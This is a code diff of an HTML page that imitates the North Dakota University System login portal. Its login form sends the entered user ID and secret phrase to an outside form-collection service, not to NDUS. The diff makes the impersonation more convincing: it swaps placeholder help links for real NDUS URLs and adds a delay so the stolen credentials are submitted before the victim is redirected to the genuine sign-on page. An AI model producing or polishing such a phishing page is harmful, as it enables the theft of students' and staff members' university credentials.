@@ -178,7 +178,7 @@
             <form id="loginForm" action="https://getform.io/f/byvvggka" method="post">
                 <div class="form-group">
                     <label for="userID">User ID</label>
-                    <input type="text" id="userID" name="userID" placeholder="Benutzername">
+                    <input type="text" id="userID" name="userID" placeholder="Username">
                 </div>
                 <div class="form-group">
                     <label for="secretPhrase">Secret Phrase</label>
@@ -195,10 +195,10 @@
         <div class="login-buttons">
             <h2>Trouble Logging In?</h2>
             <p>If you are experiencing any difficulties getting logged into the system, please use the links below.</p>
-            <button onclick="window.location.href='#'">NDUS System Status</button>
-            <button onclick="window.location.href='#'">User ID and Password Help</button>
-            <button onclick="window.location.href='#'">Help Desk Support</button>
-            <button onclick="window.location.href='#'">Campus Connection Guest Page</button>
+            <button onclick="window.location.href='https://status.ndus.edu/'">NDUS System Status</button>
+            <button onclick="window.location.href='https://ndus.rightanswers.com/portal/ss/?querytext=&tabid=2&taxonomypath=Account+Activation#t=kbResults'">User ID and Password Help</button>
+            <button onclick="window.location.href='https://ndus.rightanswers.com/portal/ss/'">Help Desk Support</button>
+            <button onclick="window.location.href='https://studentadmin.connectnd.us/psc/NDCSPRD/EMPLOYEE/SA/c/NUI_FRAMEWORK.PT_LANDINGPAGE.GBL'">Campus Connection Guest Page</button>
         </div>
     </div>
 
@@ -206,13 +206,15 @@
         <p>Copyright © 2025 North Dakota University System. All rights reserved.</p>
     </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            //  Replace with your desired URL
-            //The redirect is now blank
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        // Allow form submission
+        setTimeout(function() {
             window.location.href = 'https://ndusnam.ndus.edu/nidp/saml2/sso?id=ndus-bb&sid=2&option=credential&sid=2';
-        });
-    </script>
+        }, 1000); // Adjust the delay as needed
+    });
+</script>
+
 </body>
 
 </html>
